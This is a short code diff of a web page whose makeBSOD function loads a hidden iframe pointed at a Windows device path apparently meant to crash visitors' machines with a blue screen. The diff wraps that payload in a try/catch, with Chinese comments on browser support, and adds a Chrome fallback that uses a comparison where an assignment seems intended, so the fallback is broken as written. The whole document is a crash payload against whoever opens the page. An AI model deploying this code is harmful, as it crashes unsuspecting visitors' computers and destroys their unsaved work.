@@ -14,7 +14,15 @@
     <iframe id="BSODframe" style="display:none;"></iframe>
     <script>
         function makeBSOD(){
-            document.getElementById("BSODframe").src="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
+            try{
+                //在edge和firefox上可用
+                document.getElementById("BSODframe").src="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
+            }
+            catch
+            {
+                //解决chrome不允许访问本地文件
+                window.location.href=="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
+            }
         }
     </script>
 </body>
